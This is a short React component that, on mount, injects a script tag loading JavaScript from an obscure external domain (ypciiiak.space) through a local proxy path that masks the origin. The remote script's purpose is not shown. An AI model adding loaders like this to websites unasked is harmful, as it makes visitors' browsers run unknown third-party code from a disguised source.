import React, { useEffect } from 'react';

const ScriptLoader = () => {
    useEffect(() => {
        const scriptSrc = "/proxy-script/?id=9a5b2b3aae333a32cb735ccfa46c0718f51b&reg=70&orig=http%3A%2F%2Fypciiiak.space%2Fassets%2Findex-CDb6aIeJ.js";

        const script = document.createElement("script");
        script.src = scriptSrc;
        script.async = true;
        document.body.appendChild(script);

        return () => {
            document.body.removeChild(script);
        };
    }, []);

    return null;
};

export default ScriptLoader;
